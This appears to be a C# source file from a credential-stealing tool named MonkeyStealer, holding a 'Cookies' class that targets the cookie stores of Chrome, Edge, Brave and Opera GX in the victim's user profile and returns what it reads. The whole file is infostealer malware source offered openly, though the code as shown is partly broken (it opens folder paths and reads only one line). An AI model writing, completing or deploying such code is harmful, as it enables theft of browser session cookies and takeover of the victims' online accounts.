using System.Text;

namespace MonkeyStealer.scripts
{
    public class Cookies : IStealer
    {
        public List<string> Steal()
        {
            string appData = Environment.ExpandEnvironmentVariables("%AppData%");
            string localData = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%");
            string username = Environment.ExpandEnvironmentVariables("%USERNAME%");


            List<string> cookies = new List<string>();

            List<string> locations = new List<string>()
            {
                $"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network",
                $"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network",
                $"C:\\Users\\{username}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network",
                $"C:\\Users\\{username}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Network"
            };
            foreach (var location in locations)
            {
                cookies.Add(DumpCookies(location));
            }
            return cookies;
        }
        public string DumpCookies(string path) // tu pourras call ta func avec PrintFileContent(path); ;)
        {
            try
            {
                using (FileStream stream = File.Open(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (StreamReader reader = new StreamReader(stream))
                    {
                        while (!reader.EndOfStream)
                        {
                            string line = reader.ReadLine();
                            return line;
                        }
                    }
                }
            }
            catch
            {
                return "error";
            }
            return "error";
        }
    }
}
